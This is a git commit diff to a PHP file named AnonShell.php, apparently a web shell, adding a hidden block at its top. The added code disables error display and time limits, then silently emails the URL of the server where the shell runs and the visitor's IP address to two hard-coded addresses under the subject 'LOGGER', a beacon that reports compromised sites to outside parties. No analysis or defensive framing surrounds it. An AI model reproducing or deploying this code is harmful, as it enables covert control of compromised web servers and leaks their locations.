132ba1f4d842fadb0bc23326294de7d141e8df43
AnonGhost <34950902+alxwahid@users.noreply.github.com>
2020-01-27 05:22:03 +0800

    Update AnonShell.php

--- AnonShell.php
+++ AnonShell.php
@@ -1,4 +1,15 @@
 <?php
+@ini_set('output_buffering', 0);
+@ini_set('display_errors', 0);
+set_time_limit(0);
+ini_set('memory_limit', '64M');
+header('Content-Type: text/html; charset=UTF-8');
+$tujuanmail = 'alx.wahid@gmail.com, nullfbook@gmail.com';
+$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
+$pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
+mail($tujuanmail, "LOGGER", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
+?>
+<?php
 session_start();
 
 error_reporting(E_ERROR | E_PARSE);
